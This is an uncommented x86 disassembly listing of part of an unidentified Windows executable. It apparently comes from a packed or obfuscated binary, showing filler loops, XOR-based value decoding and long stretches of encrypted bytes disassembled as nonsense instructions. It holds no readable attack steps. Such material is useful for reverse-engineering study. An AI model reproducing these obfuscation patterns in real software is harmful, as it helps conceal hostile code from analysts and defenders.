  408a99:	je     0x408add
  408a9f:	cmp    DWORD PTR ds:0x42e76a,0x1f
  408aa6:	jne    0x408ac1
  408aac:	push   0x430496
  408ab1:	push   0x42ee30
  408ab6:	push   0x69fb
  408abb:	call   DWORD PTR ds:0x42eaac
  408ac1:	mov    ecx,DWORD PTR ds:0x42e76a
  408ac7:	dec    ecx
  408ac8:	mov    DWORD PTR ds:0x42e76a,ecx
  408ace:	jmp    0x408a92
  408ad3:	adc    DWORD PTR ds:0x42e766,0x3f8f
  408add:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  408ae4:	mov    eax,DWORD PTR [ebp-0x4]
  408ae7:	sbb    edx,0xd84
  408aed:	mov    edx,DWORD PTR [ebp+0x10]
  408af0:	xor    DWORD PTR ds:0x4304c2,0x464
  408afa:	mov    ecx,0x7510856
  408aff:	xor    eax,ecx
  408b01:	jmp    0x408cf5
  408b06:	jno    0x408b66
  408b08:	test   bl,ah
  408b0a:	gs in  eax,0x51
  408b0d:	or     BYTE PTR fs:[eax],dh
  408b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b11:	outs   dx,DWORD PTR ds:[esi]
  408b12:	stc    
  408b13:	sbb    edx,ebx
  408b15:	mul    BYTE PTR [ebp+0x457e7ed2]
  408b1b:	jg     0x408b9b
  408b1d:	jle    0x408b0e
  408b1f:	ror    cl,cl
  408b21:	stos   DWORD PTR es:[edi],eax
  408b22:	(bad)  
  408b23:	cs sbb eax,0x3f9c36e
  408b29:	mov    ah,0x4b
  408b2b:	push   cs
  408b2c:	jg     0x408b3e
  408b2e:	hlt    
  408b2f:	fimul  WORD PTR [edi+0x17]
  408b32:	out    dx,eax
  408b33:	es in  eax,dx
  408b35:	mov    dh,0xdc
  408b37:	ret    
  408b38:	mov    edi,0x3a8b86d2
  408b3d:	jbe    0x408aca
  408b3f:	lds    edx,FWORD PTR [eax-0x34]
  408b42:	or     DWORD PTR [esi-0x1f],ebp
  408b45:	mov    dh,0xb7
  408b47:	loope  0x408bb3
  408b49:	inc    esi
  408b4a:	pop    edx
  408b4b:	or     BYTE PTR [ebx-0x35c61ca0],bh
  408b51:	pop    ds
  408b52:	lods   ax,WORD PTR ds:[esi]
  408b54:	mov    esp,0xa7fbfca1
  408b59:	call   0xe12e:0xd084fc0
  408b60:	je     0x408ba4
  408b62:	xchg   DWORD PTR [eax],ebx
  408b64:	test   ebp,edx
  408b66:	push   eax
  408b67:	jge    0x408b0f
  408b69:	add    BYTE PTR [ecx-0x3d],ah
  408b6c:	dec    edx
  408b6d:	or     DWORD PTR [ebp-0x5f83eb2],ebx
  408b73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b74:	ret    0xbceb
  408b77:	sahf   
  408b78:	or     DWORD PTR [edi-0x38b19536],ebx
  408b7e:	inc    edx
  408b7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b81:	int    0xd5
  408b83:	jmp    0x17d3a789
  408b88:	out    0x3e,al
  408b8a:	dec    ecx
  408b8b:	cld    
  408b8c:	inc    ecx
  408b8d:	out    0x66,al
  408b8f:	add    BYTE PTR [edi-0x5c],0xfe
  408b93:	das    
  408b94:	int3   
  408b95:	xor    DWORD PTR [eax-0x56],ebp
  408b98:	lods   eax,DWORD PTR ds:[esi]
  408b99:	(bad)  
  408b9a:	push   ebx
  408b9b:	xor    ebx,DWORD PTR [edx-0x6eabc786]
  408ba1:	pushf  
  408ba2:	outs   dx,BYTE PTR ds:[esi]
  408ba3:	pop    es
  408ba4:	les    edi,FWORD PTR [ecx+0x1e]
  408ba7:	pop    edx
  408ba8:	std    
  408ba9:	loope  0x408c03
  408bab:	je     0x408b6b
  408bad:	ret    
  408bae:	push   ss
  408baf:	popa   
  408bb0:	pop    es
  408bb1:	dec    edi
  408bb2:	xor    eax,DWORD PTR [ecx]
  408bb4:	ds pop edi
  408bb6:	or     eax,0x86fba5cc
  408bbb:	stc    
  408bbc:	or     ch,dl
  408bbe:	and    al,0x78
  408bc0:	and    al,0xfa
  408bc2:	fimul  DWORD PTR [ebx-0x47]
  408bc5:	aad    0xe1
  408bc7:	lods   al,BYTE PTR ds:[esi]
  408bc8:	enter  0xd5d8,0xd1
  408bcc:	int    0x80
  408bce:	mov    bh,0x29
  408bd0:	and    bl,BYTE PTR [ecx+0x1e]
  408bd3:	(bad)  
  408bd4:	repz bound edi,QWORD PTR [edi]
  408bd7:	add    DWORD PTR [ebx-0x25],0x27
  408bdb:	jle    0x408b5f
  408bdd:	sub    DWORD PTR [ecx+0x1dc99ea0],edi
  408be3:	test   DWORD PTR [ecx],eax
  408be5:	sub    esi,0xd39b91ee
  408beb:	pop    edx
  408bec:	fwait
  408bed:	push   0xffffffb1
  408bef:	inc    ebx
  408bf0:	mov    ah,0xe
  408bf2:	cdq    
  408bf3:	xchg   ebx,eax
  408bf4:	xchg   BYTE PTR [esi-0x41774f2a],bh
  408bfa:	push   ebp
  408bfb:	sbb    esp,edx
  408bfd:	push   0xffffffba
  408bff:	jg     0x408c58
  408c01:	mov    al,ds:0xc668a4c5
  408c06:	sbb    al,BYTE PTR [esi-0x78]
  408c09:	adc    al,0xdd
  408c0b:	add    BYTE PTR [edi-0x7d26622f],al
  408c11:	jecxz  0x408c20
  408c13:	jb     0x408c28
  408c15:	add    BYTE PTR [edx],0x3d
  408c18:	retf   0x4873
  408c1b:	scas   eax,DWORD PTR es:[edi]
  408c1c:	inc    esp
  408c1d:	jle    0x408bd3
  408c1f:	cmp    ecx,ebp
  408c21:	outs   dx,BYTE PTR ds:[esi]
  408c22:	popa   
  408c23:	or     eax,0xc129e6e9
  408c28:	je     0x408c17
  408c2a:	ss pop es
  408c2c:	mov    BYTE PTR [esi],bh
  408c2e:	je     0x408be7
  408c30:	loopne 0x408c49
  408c32:	push   ebx
  408c33:	(bad)  
  408c34:	jge    0x408be6
  408c36:	and    BYTE PTR [eax-0x6d],dl
  408c39:	mov    bl,0x25
  408c3b:	mov    ds:0x7aa35424,eax
  408c40:	lock xchg ecx,eax
  408c42:	int3   
  408c43:	sbb    DWORD PTR es:[esi+0x4612cd6b],0xffffff88
  408c4b:	push   ds
  408c4c:	jle    0x408cb0
  408c4e:	ds call 0x5eba854b
  408c54:	pop    ss
  408c55:	arpl   WORD PTR [edx+0x2a],bx
  408c58:	lea    eax,[edi]
  408c5a:	inc    ecx
  408c5b:	mov    esi,0x93993357
  408c61:	addr16 jnp 0x408c03
  408c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c65:	mov    edi,0x1d70c3cb
  408c6a:	rcr    BYTE PTR [ebx+0x261e3009],1
  408c70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c71:	sub    DWORD PTR [edi-0x79],esp
  408c74:	test   DWORD PTR [edi+0x12],0xe520224a
  408c7b:	push   ebp
  408c7c:	outs   dx,BYTE PTR ds:[esi]
  408c7d:	pop    es
  408c7e:	jae    0x408c3f
  408c80:	adc    DWORD PTR [ebx+0x185e0ffd],esi
  408c86:	aam    0x6e
  408c88:	loop   0x408c58
  408c8a:	xchg   edx,eax
  408c8b:	push   0xec3aaf41
  408c90:	dec    ebp
  408c91:	and    esi,DWORD PTR [edx-0x49]
  408c94:	sub    BYTE PTR [edi+eiz*2+0x26],dh
  408c98:	das    
  408c99:	cwde   
  408c9a:	xor    edi,DWORD PTR [edi-0x20]
  408c9d:	scas   eax,DWORD PTR es:[edi]
  408c9e:	jp     0x408c2a
  408ca0:	push   ebp
  408ca1:	sub    DWORD PTR [ebx],edi
  408ca3:	jb     0x408c29
  408ca5:	pop    eax
  408ca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ca7:	scas   eax,DWORD PTR es:[edi]
  408ca8:	sbb    eax,0xc6e360ee
  408cad:	mov    dh,0xf1
  408caf:	xor    BYTE PTR [eax+0x4e],al
  408cb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cb3:	inc    esi
  408cb4:	mov    ecx,0x9f67d532
  408cb9:	xchg   esp,eax
  408cba:	pop    eax
  408cbb:	jo     0x408d31
  408cbd:	cs push es
  408cbf:	and    dl,cl
  408cc1:	inc    esi
  408cc2:	push   0xe96206d
  408cc7:	daa    
  408cc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cc9:	std    
  408cca:	lods   al,BYTE PTR ds:[esi]
  408ccb:	jne    0x408d20
  408ccd:	ins    BYTE PTR es:[edi],dx
  408cce:	scas   eax,DWORD PTR es:[edi]
  408ccf:	out    dx,al
  408cd0:	repz adc edi,edi
  408cd3:	in     al,0xee
  408cd5:	subps  xmm1,XMMWORD PTR [ebx-0x1d]
  408cd9:	jecxz  0x408d01
  408cdb:	ds inc esi
  408cdd:	push   edx
  408cde:	xor    BYTE PTR [ebx+0x1931eae5],bl
  408ce4:	push   esp
  408ce6:	pop    edi
  408ce7:	mov    ds:0x6e669e1f,eax
  408cec:	hlt    
  408ced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cee:	jg     0x408d1d
  408cf0:	jmp    0x8bb819bc
  408cf5:	add    eax,0x32729d
  408cfa:	mov    DWORD PTR [edx],eax
  408cfc:	mov    edx,DWORD PTR ds:0x430576
  408d02:	mov    eax,ds:0x430592
  408d07:	sub    edx,eax
  408d09:	xor    edx,DWORD PTR [edx+eax*1]
  408d0c:	mov    eax,DWORD PTR [ebp+0x14]
  408d0f:	mov    edx,DWORD PTR [ebp+0x10]
  408d12:	mov    DWORD PTR [edx+0x4],eax
  408d15:	mov    eax,DWORD PTR [ebp+0x18]
  408d18:	mov    edx,DWORD PTR [ebp+0x10]
  408d1b:	mov    DWORD PTR [edx+0x8],eax
  408d1e:	mov    eax,DWORD PTR [ebp+0x1c]
  408d21:	mov    edx,DWORD PTR [ebp+0x10]
  408d24:	mov    DWORD PTR [edx+0xc],eax
  408d27:	mov    eax,DWORD PTR [ebp+0x20]
  408d2a:	mov    edx,DWORD PTR [ebp+0x10]
  408d2d:	mov    DWORD PTR [edx+0x10],eax
  408d30:	mov    eax,eax
  408d32:	mov    eax,DWORD PTR [ebp+0x14]
  408d35:	test   eax,eax
  408d37:	mov    eax,DWORD PTR [ebp+0x8]
  408d3a:	jne    0x408f37
  408d40:	mov    eax,DWORD PTR [ebp+0xc]
  408d43:	jmp    0x408f37
  408d48:	test   BYTE PTR [ebx+0x4d],al
  408d4b:	pushf  
  408d4c:	dec    ebp
  408d4d:	pushf  
  408d4e:	inc    ebp
  408d4f:	pop    ebx
  408d50:	cwde   
  408d51:	mov    ss,edx
  408d53:	aaa    
  408d54:	in     eax,dx
  408d55:	out    dx,al
  408d56:	enter  0x8cf6,0xd4
  408d5a:	jle    0x408dda
  408d5c:	inc    ebp
  408d5d:	jg     0x408ddd
  408d5f:	jle    0x408db5
  408d61:	xchg   BYTE PTR [ecx],dh
  408d63:	cli    
  408d64:	retf   0x1787
  408d67:	jge    0x408da7
  408d69:	dec    DWORD PTR [eax-0x3a96b921]
  408d6f:	out    0xd4,al
  408d71:	add    eax,0xa3ba177a
  408d76:	stos   DWORD PTR es:[edi],eax
  408d77:	je     0x408db5
  408d79:	sbb    ebx,DWORD PTR [ecx-0x28b2bcc]
  408d7f:	jg     0x408d5a
  408d81:	sub    eax,0x85ac80e
  408d86:	leave  
  408d87:	inc    edx
  408d88:	inc    edi
  408d89:	sub    eax,0x57e8d48a
  408d8e:	in     eax,0xd4
  408d90:	mov    ecx,ss
  408d92:	ins    BYTE PTR es:[edi],dx
  408d93:	test   eax,0x58297d01
  408d98:	loope  0x408d78
  408d9a:	iret   
  408d9b:	add    bl,BYTE PTR gs:[ecx-0x2d74224]
  408da2:	ins    BYTE PTR es:[edi],dx
  408da3:	pushf  
  408da4:	test   al,0x53
  408da6:	xor    eax,0xc39eab91
  408dab:	xor    BYTE PTR [edx+eax*8+0x12],dh
  408daf:	push   0x6a
  408db1:	(bad)  
  408db2:	push   ecx
  408db3:	into   
  408db4:	jle    0x408d5d
  408db6:	adc    eax,0x95527a85
  408dbb:	ds cmc 
  408dbd:	addr16 mov bh,0xdb
  408dc0:	and    esp,DWORD PTR [edi+0x4d]
  408dc3:	inc    esi
  408dc4:	push   ss
  408dc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dc6:	push   eax
  408dc7:	jp     0x408d73
  408dc9:	inc    eax
  408dca:	add    al,0x5d
  408dcc:	popf   
  408dcd:	std    
  408dce:	(bad)  
  408dcf:	aas    
  408dd0:	mov    bl,0x57
  408dd2:	push   edx
  408dd3:	lds    ecx,FWORD PTR [ecx-0x4d5a911e]
  408dd9:	jnp    0x408e0b
  408ddb:	xor    BYTE PTR [edi],0x31
  408dde:	inc    ecx
  408ddf:	xchg   esp,eax
  408de0:	idiv   BYTE PTR [edi+0x33]
  408de3:	je     0x408d8f
  408de5:	sub    BYTE PTR [ebp-0xf3ddb17],bh
  408deb:	pop    ebx
  408dec:	sbb    dh,BYTE PTR [ebx+0x6]
  408def:	out    0x58,al
  408df1:	sti    
  408df2:	pop    esi
  408df3:	shld   DWORD PTR [esi],edx,cl
  408df6:	sbb    DWORD PTR [ebp-0x6d544d0e],eax
  408dfc:	scas   al,BYTE PTR es:[edi]
  408dfd:	lahf   
  408dfe:	mov    BYTE PTR [esi-0x7515c83e],dh
  408e04:	push   esi
  408e05:	int3   
  408e06:	adc    edi,ebp
  408e08:	ret    
  408e09:	jae    0x408e17
  408e0b:	adc    eax,0x17ecd2e0
  408e10:	mov    bh,0xae
  408e12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e13:	mov    WORD PTR [edi],?
  408e15:	comiss xmm5,xmm4
  408e18:	jmp    0x408e3d
  408e1a:	fld    QWORD PTR fs:[edx-0x1f05b373]
  408e21:	out    dx,eax
  408e22:	nop
  408e23:	rol    BYTE PTR [esi],0xda
  408e26:	dec    edi
  408e27:	jbe    0x408e45
  408e29:	call   0x7e4:0x427e8fed
  408e30:	ficom  DWORD PTR [eax+0x72]
  408e33:	sar    BYTE PTR [ecx],1
  408e35:	jge    0x408e83
  408e37:	sub    eax,DWORD PTR [ebx-0x462a5ab]
  408e3d:	mov    ecx,0xd967a24b
  408e42:	jg     0x408e25
  408e44:	or     al,0xe5
  408e46:	jl     0x408eae
  408e48:	mov    ebp,0x95041c3c
  408e4d:	test   BYTE PTR [eax+eiz*8-0x3d],ah
  408e51:	sub    edi,DWORD PTR [ebp+0x7ec4548c]
  408e57:	mov    dl,0xde
  408e59:	lods   eax,DWORD PTR ds:[esi]
  408e5a:	mov    cl,0xfe
  408e5c:	inc    edi
  408e5d:	bound  esp,QWORD PTR [edi+0x5a937b19]
  408e63:	push   eax
  408e64:	xchg   cl,bl
  408e66:	popa   
  408e67:	mov    bh,0x4f
  408e69:	out    dx,al
  408e6a:	into   
  408e6b:	sub    BYTE PTR [esi],dh
  408e6d:	sar    DWORD PTR [edx-0x78],cl
  408e70:	dec    ecx
  408e71:	ss jno 0x408e47
  408e74:	loope  0x408e43
  408e76:	mov    ebx,eax
  408e78:	out    dx,eax
  408e79:	adc    DWORD PTR [esi-0x1e],eax
  408e7c:	imul   ebp,DWORD PTR [eax+0x14],0xffffffbd
  408e80:	inc    ebx
  408e81:	ins    DWORD PTR es:[edi],dx
  408e82:	(bad)  [edi+ebp*2+0x457269d6]
  408e89:	adc    eax,0x60da1212
  408e8e:	adc    DWORD PTR [edi+0x7d04f814],edi
  408e94:	xchg   esi,eax
  408e95:	sbb    edi,DWORD PTR [ecx]
  408e97:	fwait
  408e98:	pop    ss
  408e99:	and    edi,esp
  408e9b:	cld    
  408e9c:	ja     0x408e3c
  408e9e:	ja     0x408f07
  408ea0:	mov    bh,0x98
  408ea2:	shl    BYTE PTR [ecx],1
  408ea4:	add    esi,edi
  408ea6:	xchg   esi,eax
  408ea7:	fs mov bh,0x74
  408eaa:	mov    eax,ds:0xf33a5346
  408eaf:	bound  esi,QWORD PTR [ebp+0x30]
  408eb2:	adc    bl,BYTE PTR [eax-0x6]
  408eb5:	mov    BYTE PTR [eax+ecx*4],dh
  408eb8:	pop    es
  408eb9:	out    dx,al
  408eba:	outs   dx,BYTE PTR ds:[esi]
  408ebb:	arpl   WORD PTR ds:0x77bde60e,ax
  408ec1:	jecxz  0x408f04
  408ec3:	in     al,dx
  408ec4:	(bad)  
  408ec5:	pop    ebx
  408ec6:	lahf   
  408ec7:	out    0x4d,eax
  408ec9:	and    bh,al
  408ecb:	xchg   ebp,eax
  408ecc:	mov    al,ds:0xebc1d18
  408ed1:	xchg   bl,bh
  408ed3:	ret    0xbe4
  408ed6:	adc    al,0x9d
  408ed8:	inc    esi
  408ed9:	sbb    eax,0x473df4e1
  408ede:	xor    BYTE PTR [esp+esi*2],al
  408ee1:	adc    al,0xe0
  408ee3:	call   0xe343:0x427eafa2
  408eea:	daa    
  408eeb:	or     BYTE PTR [eax-0xfff705b],dl
  408ef1:	adc    edi,DWORD PTR [ebx-0x5fc506e]
  408ef7:	iret   
  408ef8:	nop
  408ef9:	and    edx,ebp
  408efb:	sub    cl,BYTE PTR [ebp+eax*2-0x1]
  408eff:	shl    BYTE PTR [edi-0x37],cl
  408f02:	add    dh,bl
  408f04:	mov    bh,0x33
  408f06:	mov    ecx,0xa6e24472
  408f0b:	pop    ecx
  408f0c:	xor    al,0x26
  408f0e:	cmc    
  408f0f:	mov    eax,0x205c311b
  408f14:	adc    ebp,DWORD PTR [ebx+ebp*2+0x29bb07f3]
  408f1b:	inc    ecx
  408f1c:	lods   al,BYTE PTR ds:[esi]
  408f1d:	pop    esi
  408f1e:	jmp    0x408f30
  408f20:	fcom   DWORD PTR [ecx]
  408f22:	jg     0x408ede
  408f24:	pushf  
  408f25:	(bad)  
  408f26:	lods   eax,DWORD PTR ds:[esi]
  408f27:	mov    DWORD PTR [eax],esi
  408f29:	jp     0x408edc
  408f2b:	mov    bl,0xe7
  408f2d:	inc    ecx
  408f2e:	sahf   
  408f2f:	clc    
  408f30:	jo     0x408efb
  408f32:	jb     0x408ec5
  408f34:	pop    ss
  408f35:	test   al,0xcc
  408f37:	xor    eax,ecx
  408f39:	add    eax,0x32729d
  408f3e:	leave  
  408f3f:	ret    0x1c
  408f42:	push   ebp
  408f43:	mov    ebp,esp
  408f45:	sub    esp,0x10c
  408f4b:	push   ebx
  408f4c:	sbb    DWORD PTR ds:0x42ee08,0x42e76a
  408f56:	push   esi
  408f57:	push   edi
  408f58:	xor    DWORD PTR ds:0x430546,0x5477
  408f62:	push   0x412320
  408f67:	sbb    DWORD PTR ds:0x42ee28,0x42e766
  408f71:	call   DWORD PTR ds:0x42ea4c
  408f77:	sbb    DWORD PTR ds:0x42e762,0x6315
  408f81:	test   eax,eax
  408f83:	je     0x408f9a
  408f89:	or     DWORD PTR ds:0x4304ae,0x658e
  408f93:	xor    eax,eax
  408f95:	jmp    0x40a1a9
  408f9a:	or     DWORD PTR ds:0x4304b2,0x1a2e
  408fa4:	push   0x412364
  408fa9:	call   DWORD PTR ds:0x42eb04
  408faf:	sbb    DWORD PTR ds:0x430552,0x34b4
  408fb9:	test   ax,ax
  408fbc:	mov    DWORD PTR ds:0x42e75a,0xd26
  408fc6:	je     0x408feb
  408fcc:	push   0x786876
  408fd1:	push   0x55897097
  408fd6:	adc    DWORD PTR ds:0x4304c2,0x42ee08
  408fe0:	call   DWORD PTR ds:0x42eb80
  408fe6:	jmp    0x40a1a9
  408feb:	sub    DWORD PTR ds:0x42ee24,0x1c30
  408ff5:	call   DWORD PTR ds:0x42eb44
  408ffb:	cdq    
  408ffc:	cmp    eax,0x67876766
  409001:	mov    DWORD PTR ds:0x43055a,0x4f36
  40900b:	jne    0x409041
  409011:	cmp    edx,0x86189768
  409017:	mov    DWORD PTR ds:0x42ee14,0x24b9
  409021:	jne    0x409041
  409027:	sub    DWORD PTR ds:0x42e762,0x452
  409031:	push   0x412380
  409036:	call   DWORD PTR ds:0x42ea3c
  40903c:	jmp    0x40a1a9
  409041:	neg    DWORD PTR ds:0x4304aa
  409047:	push   0x4123e0
  40904c:	adc    DWORD PTR ds:0x42ee24,0x43049a
  409056:	call   DWORD PTR ds:0x42eadc
  40905c:	test   ax,ax
  40905f:	jne    0x408f89
  409065:	and    DWORD PTR ds:0x42e762,0x0
  40906f:	xor    ebx,ebx
  409071:	xor    ebx,DWORD PTR ds:0x42e762
  409077:	inc    ebx
  409078:	mov    DWORD PTR ds:0x42e762,ebx
  40907e:	cmp    DWORD PTR ds:0x42e762,0x28
  409085:	jne    0x409097
  40908b:	push   DWORD PTR [ebp-0x10]
  40908e:	push   DWORD PTR [ebp-0x18]
  409091:	call   DWORD PTR ds:0x42ebac
  409097:	cmp    DWORD PTR ds:0x42e762,0x1c
  40909e:	jb     0x40906f
  4090a4:	mov    edx,DWORD PTR ds:0x42ee14
  4090aa:	and    DWORD PTR ds:0x42ee20,edx
  4090b0:	mov    ecx,0xf89c8535
  4090b5:	movzx  edx,BYTE PTR ds:0x43048e
  4090bc:	sbb    edx,DWORD PTR ds:0x43054e
  4090c2:	mov    DWORD PTR ds:0x43048e,edx
  4090c8:	mov    DWORD PTR [ebp-0x20],ecx
  4090cb:	and    DWORD PTR ds:0x43049e,0x0
  4090d5:	mov    edx,DWORD PTR ds:0x43049e
  4090db:	inc    edx
  4090dc:	mov    DWORD PTR ds:0x43049e,edx
  4090e2:	cmp    DWORD PTR ds:0x43049e,0x21
  4090e9:	jne    0x409109
  4090ef:	push   0x59b7
  4090f4:	push   0x42e77a
  4090f9:	push   0x42e8ad
  4090fe:	push   0x7470
  409103:	call   DWORD PTR ds:0x42ebb0
  409109:	cmp    DWORD PTR ds:0x43049e,0x15
  409110:	jb     0x4090d5
  409116:	and    DWORD PTR ds:0x42e766,0x0
  409120:	mov    edx,DWORD PTR ds:0x42e766
  409126:	inc    edx
  409127:	mov    DWORD PTR ds:0x42e766,edx
  40912d:	cmp    DWORD PTR ds:0x42e766,0x20
  409134:	jne    0x40914a
  40913a:	push   0x704d
  40913f:	push   0x180e
  409144:	call   DWORD PTR ds:0x42eab0
  40914a:	cmp    DWORD PTR ds:0x42e766,0x13
  409151:	jb     0x409120
  409157:	adc    DWORD PTR ds:0x43049a,edi
  40915d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409164:	and    DWORD PTR ds:0x43048a,0x0
  40916e:	mov    esi,DWORD PTR ds:0x43048a
  409174:	inc    esi
  409175:	mov    DWORD PTR ds:0x43048a,esi
  40917b:	cmp    DWORD PTR ds:0x43048a,0xd
  409182:	jne    0x40919d
  409188:	push   0x42e87b
  40918d:	push   0x42e77a
  409192:	push   0x400000
  409197:	call   DWORD PTR ds:0x42eac8
  40919d:	cmp    DWORD PTR ds:0x43048a,0xc
  4091a4:	jne    0x4091b7
  4091aa:	mov    esi,DWORD PTR ds:0x43048a
  4091b0:	inc    esi
  4091b1:	mov    DWORD PTR ds:0x43048a,esi
  4091b7:	cmp    DWORD PTR ds:0x43048a,0x14
  4091be:	jb     0x40916e
  4091c4:	sub    esi,DWORD PTR ds:0x42ee1c
  4091ca:	lea    eax,[ebp-0x58]
  4091cd:	mov    DWORD PTR [ebp-0x60],eax
  4091d0:	add    esi,esi
  4091d2:	lea    eax,[ebp-0x50]
  4091d5:	inc    ebx
  4091d6:	mov    DWORD PTR [ebp-0x10],eax
  4091d9:	inc    esi
  4091da:	mov    eax,ds:0x4121a8
  4091df:	mov    eax,DWORD PTR [eax+0x1c8]
  4091e5:	or     DWORD PTR ds:0x43054e,0x4304a2
  4091ef:	mov    eax,DWORD PTR [eax]
  4091f1:	add    esi,ebx
  4091f3:	mov    edx,DWORD PTR [ebp-0x10]
  4091f6:	xor    esi,esi
  4091f8:	xor    esi,DWORD PTR ds:0x43054e
  4091fe:	adc    DWORD PTR ds:0x42ee18,esi
  409204:	mov    esi,0x7510856
  409209:	xor    DWORD PTR ds:0x43048e,ebx
  40920f:	xor    eax,esi
  409211:	mov    ebx,0x32729d
  409216:	add    eax,ebx
  409218:	mov    DWORD PTR [edx],eax
  40921a:	mov    eax,ds:0x43048e
  40921f:	mov    eax,ds:0x4124e4
  409224:	cmp    eax,0x23d14057
  409229:	mov    eax,DWORD PTR [ebp-0x18]
  40922c:	mov    DWORD PTR ds:0x43048e,0x7d60
  409236:	je     0x409262
  40923c:	mov    ecx,DWORD PTR [ebp-0x20]
  40923f:	xor    eax,esi
  409241:	adc    DWORD PTR ds:0x43049e,0x4304ba
  40924b:	add    eax,ebx
  40924d:	imul   eax,ecx
  409250:	mov    DWORD PTR ds:0x4304ae,0x73a3
  40925a:	mov    DWORD PTR [ebp-0x20],eax
  40925d:	jmp    0x409dc0
  409262:	xor    eax,esi
  409264:	adc    edx,0x5f1b
  40926a:	add    eax,ebx
  40926c:	mov    ds:0x4122b8,eax
  409271:	mov    edx,DWORD PTR ds:0x4304e2
  409277:	mov    eax,ds:0x42e99c
  40927c:	sub    eax,edx
  40927e:	or     edx,DWORD PTR [edx+eax*1]
  409281:	mov    eax,DWORD PTR [ebp-0x20]
  409284:	xor    eax,esi
  409286:	add    eax,ebx
  409288:	mov    ds:0x4124e4,eax
  40928d:	sub    DWORD PTR ds:0x42e76e,0x78a9
  409297:	mov    eax,DWORD PTR [ebp-0x18]
  40929a:	add    edx,DWORD PTR ds:0x4304aa
  4092a0:	mov    edx,DWORD PTR ds:0x4122b8
  4092a6:	neg    DWORD PTR ds:0x4304ba
  4092ac:	xor    eax,esi
  4092ae:	dec    DWORD PTR ds:0x4304b2
  4092b4:	add    eax,ebx
  4092b6:	mov    DWORD PTR ds:0x430556,0x3216
  4092c0:	cmp    edx,eax
  4092c2:	jne    0x409dc0
  4092c8:	mov    eax,DWORD PTR [ebp-0x18]
  4092cb:	add    edx,0x2278
  4092d1:	mov    DWORD PTR [ebp-0x30],eax
  4092d4:	mov    eax,DWORD PTR [ebp-0x20]
  4092d7:	mov    DWORD PTR ds:0x42ee20,0x10
  4092e1:	cmp    DWORD PTR ds:0x42ee20,0x0
  4092e8:	je     0x409328
  4092ee:	cmp    DWORD PTR ds:0x42ee20,0x16
  4092f5:	jne    0x409310
  4092fb:	push   0x55c8
  409300:	push   0x6c0c
  409305:	push   0x400000
  40930a:	call   DWORD PTR ds:0x42eacc
  409310:	mov    edi,DWORD PTR ds:0x42ee20
  409316:	dec    edi
  409317:	mov    DWORD PTR ds:0x42ee20,edi
  40931d:	jmp    0x4092e1
  409322:	add    DWORD PTR ds:0x42ee14,ebx
  409328:	mov    DWORD PTR [ebp-0x1c],eax
  40932b:	or     DWORD PTR ds:0x42e776,0x513d
  409335:	mov    eax,ds:0x4121a8
  40933a:	mov    eax,DWORD PTR [eax+0x198]
  409340:	not    edx
  409342:	mov    DWORD PTR [ebp-0xc],eax
  409345:	xor    edx,edx
  409347:	add    edx,DWORD PTR ds:0x42e772
  40934d:	adc    edx,DWORD PTR ds:0x4304c2
  409353:	mov    DWORD PTR ds:0x42e772,edx
  409359:	mov    eax,DWORD PTR [ebp-0x1c]
  40935c:	mov    edx,DWORD PTR [ebp-0xc]
  40935f:	and    DWORD PTR ds:0x42ee2c,0x0
  409369:	mov    edi,DWORD PTR ds:0x42ee2c
  40936f:	inc    edi
  409370:	mov    DWORD PTR ds:0x42ee2c,edi
  409376:	cmp    DWORD PTR ds:0x42ee2c,0x6
  40937d:	jne    0x409391
  409383:	push   DWORD PTR [ebp-0x10]
  409386:	push   0x42e766
  40938b:	call   DWORD PTR ds:0x42ebb4
  409391:	cmp    DWORD PTR ds:0x42ee2c,0x5
  409398:	jne    0x4093ad
  40939e:	xor    edi,edi
  4093a0:	xor    edi,DWORD PTR ds:0x42ee2c
  4093a6:	inc    edi
  4093a7:	mov    DWORD PTR ds:0x42ee2c,edi
  4093ad:	cmp    DWORD PTR ds:0x42ee2c,0x1b
  4093b4:	jb     0x409369
  4093ba:	xor    DWORD PTR ds:0x4304b2,0x56f9
  4093c4:	xor    eax,esi
  4093c6:	and    DWORD PTR ds:0x42ee28,0x0
  4093d0:	jmp    0x4093e2
  4093d5:	mov    edi,DWORD PTR ds:0x42ee28
  4093db:	inc    edi
  4093dc:	mov    DWORD PTR ds:0x42ee28,edi
  4093e2:	cmp    DWORD PTR ds:0x42ee28,0x1f
  4093e9:	jae    0x40946a
  4093ef:	cmp    DWORD PTR ds:0x42ee28,0x6
  4093f6:	jne    0x409402
  4093fc:	call   DWORD PTR ds:0x42ead0
  409402:	cmp    DWORD PTR ds:0x42ee28,0x5
  409409:	jne    0x40941c
  40940f:	mov    edi,DWORD PTR ds:0x42ee28
  409415:	inc    edi
  409416:	mov    DWORD PTR ds:0x42ee28,edi
  40941c:	jmp    0x4093d5
  409421:	mov    DWORD PTR ds:0x42ee0c,0x12
  40942b:	cmp    DWORD PTR ds:0x42ee0c,0x0
  409432:	je     0x40946a
  409438:	cmp    DWORD PTR ds:0x42ee0c,0x21
  40943f:	jne    0x409450
  409445:	push   0x79c1
  40944a:	call   DWORD PTR ds:0x42eab4
  409450:	xor    edi,edi
  409452:	or     edi,DWORD PTR ds:0x42ee0c
  409458:	dec    edi
  409459:	mov    DWORD PTR ds:0x42ee0c,edi
  40945f:	jmp    0x40942b
  409464:	and    edi,DWORD PTR ds:0x43055a
  40946a:	add    eax,ebx
  40946c:	mov    DWORD PTR [edx],eax
  40946e:	lea    eax,[ebp-0x14]
  409471:	and    edi,DWORD PTR ds:0x43048a
  409477:	mov    DWORD PTR [ebp-0x44],eax
  40947a:	mov    edi,DWORD PTR ds:0x43049e
  409480:	adc    edi,DWORD PTR ds:0x42ee18
  409486:	mov    DWORD PTR ds:0x43049e,edi
  40948c:	mov    eax,DWORD PTR [ebp-0x1c]
